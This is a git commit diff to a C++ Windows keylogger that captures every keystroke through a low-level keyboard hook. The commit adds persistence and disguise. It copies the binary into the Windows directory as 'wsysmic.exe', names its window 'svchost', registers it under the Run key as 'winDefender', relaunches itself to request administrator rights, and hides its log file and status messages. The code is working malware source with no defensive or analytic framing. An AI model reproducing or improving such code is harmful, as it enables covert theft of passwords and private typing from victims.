8fcb37a28c61aade05fc711f68eb625e9a0ff5e9
ezequiel <ezequiel@localhost.localdomain>
2017-07-08 20:09:33 -0300

    adding autostart registry

--- Mishagui/WinMain.cpp
+++ Mishagui/WinMain.cpp
@@ -1,10 +1,12 @@
 
 #include "WinMain.h"
-#include <sstream>
 
 LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+BOOL IsRunAsAdmin();
+int makeMeAdmin( HWND hWnd );
 long createRegistry( LPCTSTR data );
+
 Logger* logger = new Logger(LOG_FILE);
 
 
@@ -16,12 +18,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst, PSTR szCmdLine, int
 	WNDCLASSEX wndcls;
 	ERROR_SUCCESS;
 	const char g_szClassName[] = "michifu";
-	char* destination = (char*)malloc(sizeof(char) * 256);
-	char* iam = (char*)malloc(sizeof(char) * 256);
+	char* destination = (char*)malloc(sizeof(char) * MAX_PATH);
+	char* iam = (char*)malloc(sizeof(char) * MAX_PATH);
 
-	strcpy(destination, std::getenv("TMP") );
-	strcat(destination, "\\system32\\wsysmic.exe");
-	GetModuleFileName(NULL, iam, 256);
+	strcpy(destination, std::getenv("windir") );
+	strcat(destination, "\\wsysmic.exe");
+	GetModuleFileName(NULL, iam, sizeof(char)*MAX_PATH );
 
 	wndcls.cbSize = sizeof(WNDCLASSEX);
 	wndcls.style = CS_HREDRAW | CS_VREDRAW;
@@ -36,12 +38,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst, PSTR szCmdLine, int
 	wndcls.lpszMenuName = NULL;
 	wndcls.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
 
-	( !RegisterClassEx(&wndcls) ) ? logger->write("can not register window class!\n") : logger->write("windows class registered !\n");
-	
+	( !RegisterClassEx(&wndcls) ) ? logger->write("[ register class success ]\n") : logger->write("[ register class fail ]\n");
 	hwnd = CreateWindowEx(NULL,	g_szClassName, "svchost", NULL, 0, 0, 0, 0,	NULL, NULL, hInstance, NULL);
-	
-	( !CopyFile(iam, destination, 0) ) ? MessageBox(hwnd, "error copiando", destination, 1) : MessageBox(hwnd, "exito", iam, 1);
-	( createRegistry( destination ) == ERROR_SUCCESS ) ? MessageBox(hwnd, "registro success", destination, 1) : MessageBox(hwnd, "error registro", iam, 1);
+
+	if (!IsRunAsAdmin()) makeMeAdmin(hwnd);
+
+	( !CopyFile(iam, destination, 0) ) ? logger->write("[ copy success ]\n") : logger->write ("[ copy fail ]\n" );
+	(createRegistry(destination) == ERROR_SUCCESS) ? logger->write("[ register success ]\n") : logger->write("[ register fail ]");
     
 	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
 	(hhkLowLevelKybd != NULL) ? logger->write("hhkLowLevelKybd hooked !\n") : logger->write("hhkLowLevelKybd failed !\n");
@@ -115,7 +118,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			logger->write("/");
 			break;
 		case VK_ESCAPE:
-			logger->write("[ ESC ]");
+			//logger->write("[ ESC ]");
 			break;
 		case VK_TAB:
 			logger->write("\t");
@@ -169,58 +172,58 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			logger->write("\n");
 			break;
 		case VK_DOWN:
-			logger->write("[ DOWN ]");
+			//logger->write("[ DOWN ]");
 			break;
 		case VK_UP:
-			logger->write("[ UP ]");
+			//logger->write("[ UP ]");
 			break;
 		case VK_LEFT:
-			logger->write("[ LEFT ]");
+			//logger->write("[ LEFT ]");
 			break;
 		case VK_RIGHT:
-			logger->write("[ RIGHT ]");
+			//logger->write("[ RIGHT ]");
 			break;
 		case VK_LCONTROL:
-			logger->write("[ L_CONTROL ]");
+			//logger->write("[ L_CONTROL ]");
 			break;
 		case VK_RCONTROL:
-			logger->write("[ R_CONTROL ]");
+			//logger->write("[ R_CONTROL ]");
 			break;
 		case VK_F1:
-			logger->write("[ F1 ]");
+			//logger->write("[ F1 ]");
 			break;
 		case VK_F2:
-			logger->write("[ F2 ]");
+			//logger->write("[ F2 ]");
 			break;
 		case VK_F3:
-			logger->write("[ F3 ]");
+			//logger->write("[ F3 ]");
 			break;
 		case VK_F4:
-			logger->write("[ F4 ]");
+			//logger->write("[ F4 ]");
 			break;
 		case VK_F5:
-			logger->write("[ F5 ]");
+			//logger->write("[ F5 ]");
 			break;
 		case VK_F6:
-			logger->write("[ F6 ]");
+			//logger->write("[ F6 ]");
 			break;
 		case VK_F7:
-			logger->write("[ F7 ]");
+			//logger->write("[ F7 ]");
 			break;
 		case VK_F8:
-			logger->write("[ F8 ]");
+			//logger->write("[ F8 ]");
 			break;
 		case VK_F9:
-			logger->write("[ F9 ]");
+			//logger->write("[ F9 ]");
 			break;
 		case VK_F10:
-			logger->write("[ F10 ]");
+			//logger->write("[ F10 ]");
 			break;
 		case VK_F11:
-			logger->write("[ F11 ]");
+			//logger->write("[ F11 ]");
 			break;
 		case VK_F12:
-			logger->write("[ F12 ]");
+			//logger->write("[ F12 ]");
 			break;
 		default:
 			( GetKeyState(VK_SHIFT) < 0 || (GetKeyState(VK_CAPITAL) & 0x0001) != 0 ) ? logger->write(p->vkCode):logger->write( tolower(p->vkCode) );
@@ -235,11 +238,10 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT iMsg, WPARAM wParam, LPARAM lParam)
 {
-
 	switch (iMsg)
 	{
 	case WM_DESTROY:
-		logger->write("[ Closed ]\n");
+		logger->write("[ closed ]\n");
 		logger->~Logger();
 		PostQuitMessage(0);
 		return 0;
@@ -247,6 +249,73 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT iMsg, WPARAM wParam, LPARAM lParam)
 	default:
 		return DefWindowProc(hwnd, iMsg, wParam, lParam);
 	}
+}
+
+BOOL IsRunAsAdmin()
+{
+	BOOL fIsRunAsAdmin = FALSE;
+	DWORD dwError = ERROR_SUCCESS;
+	PSID pAdministratorsGroup = NULL;
+	// Allocate and initialize a SID of the administrators group.
+	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+	if (!AllocateAndInitializeSid(
+									&NtAuthority,
+									2,
+									SECURITY_BUILTIN_DOMAIN_RID,
+									DOMAIN_ALIAS_RID_ADMINS,
+									0, 0, 0, 0, 0, 0,
+									&pAdministratorsGroup))
+	{
+		dwError = GetLastError();
+		goto Cleanup;
+	}
+	// Determine whether the SID of administrators group is enabled in 
+	// the primary access token of the process.
+	if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
+	{
+		dwError = GetLastError();
+		goto Cleanup;
+	}
+
+Cleanup:
+	// Centralized cleanup for all allocated resources.
+	if (pAdministratorsGroup)
+	{
+		FreeSid(pAdministratorsGroup);
+		pAdministratorsGroup = NULL;
+	}
+
+	// Throw the error if something failed in the function.
+	if (ERROR_SUCCESS != dwError) throw dwError;
+	return fIsRunAsAdmin;
+}
+
+int makeMeAdmin(HWND hwnd) {
+
+	char* iam = (char*)malloc(sizeof(char) * MAX_PATH);
+
+	if (GetModuleFileName(NULL, iam, sizeof(char) * MAX_PATH) )
+	{
+		// Launch itself as administrator.
+		SHELLEXECUTEINFO sei = { sizeof(sei) };
+		sei.lpVerb = "runas";
+		sei.lpFile = iam;
+		sei.hwnd = hwnd;
+		sei.nShow = SW_NORMAL;
+		if (!ShellExecuteEx(&sei))
+		{
+			DWORD dwError = GetLastError();
+			if (dwError == ERROR_CANCELLED)
+			{
+				// The user refused the elevation.
+				// Do nothing ...
+				logger->write("REFUSE ADMIN");
+			}
+		}
+		else
+			DestroyWindow(hwnd);  // Quit itself
+	}
+	return 0;
 }
 
 long createRegistry(LPCTSTR data) {
@@ -257,7 +326,7 @@ long createRegistry(LPCTSTR data) {
 								TEXT ( HKEY_KEYLOGGER_SUB ),
 								0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkey, &dw);
 
-	(result == ERROR_SUCCESS) ?	result = RegSetValueEx(hkey, "testPath", 0, REG_SZ, (LPBYTE)data, strlen(data) + 1) : result = -1L;
+	(result == ERROR_SUCCESS) ?	result = RegSetValueEx(hkey, "winDefender", 0, REG_SZ, (LPBYTE)data, strlen(data) + 1) : result = -1L;
 	RegCloseKey(hkey);
 	return result;
 }
--- Mishagui/WinMain.h
+++ Mishagui/WinMain.h
@@ -1,11 +1,31 @@
 #pragma once
 
 #include<Windows.h>
+#include <windowsx.h>
 #include<iostream>
 #include<fstream>
 #include<string>
 #include "Logger.h"
 
-#define LOG_FILE "key.log"
+#define LOG_FILE "ssys"
 #define HKEY_KEYLOGGER HKEY_CURRENT_USER
-#define HKEY_KEYLOGGER_SUB "Software\\dir1\\Sub Directory"
+#define HKEY_KEYLOGGER_SUB "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+
+#define IDD_MAINDIALOG                  103
+#define IDC_BUTTON_ELEVATE              1000
+#define IDC_STATIC_INADMINGROUP         1001
+#define IDC_STATIC_ISRUNASADMIN         1002
+#define IDC_STATIC_ISELEVATED           1003
+#define IDC_STATIC_IL                   1004
+#define IDC_STATIC                      -1
+#define MAX_PATH						256
+
+#ifdef APSTUDIO_INVOKED
+	#ifndef APSTUDIO_READONLY_SYMBOLS
+		#define _APS_NO_MFC                     1
+		#define _APS_NEXT_RESOURCE_VALUE        129
+		#define _APS_NEXT_COMMAND_VALUE         32771
+		#define _APS_NEXT_CONTROL_VALUE         1005
+		#define _APS_NEXT_SYMED_VALUE           110
+	#endif
+#endif
